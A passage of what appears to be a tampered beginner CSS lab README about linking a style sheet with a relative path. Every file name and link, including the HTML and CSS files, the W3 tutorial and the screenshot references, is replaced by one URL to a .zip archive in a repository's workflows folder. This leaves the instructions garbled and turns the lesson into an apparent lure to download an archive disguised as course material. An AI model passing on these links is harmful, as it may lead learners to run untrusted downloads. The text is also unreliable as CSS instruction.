...
In `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip`, provide a `<link>` tag which correctly sources the CSS file
...
The `href` attribute should point to the file `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` which is located in
...
Now, what is a relative path? You could write `href="https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip"` and the content
of `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` would change your `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` file. But we want to teach you to
...
use `link` to associate with a style sheet and we write `href="https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip"`
we're saying: "From the directory in which I, the `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` file live, look
for a file called `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` and use it. This pattern will help you and other
...
you provide a _relative_ path to the style sheet. Hint: Open `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` in the
...
document! First, open `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` in the browser to get a good idea of what
...
sure to, after each update, look at `https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip` in the browser to see how it
has changed:
...
- [W3 Introduction to CSS](https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip)

[un-styled]:
  https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip
[styled]:
  https://github.com/GathogoG/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro-phase-css-lab-v1.8-alpha.5.zip
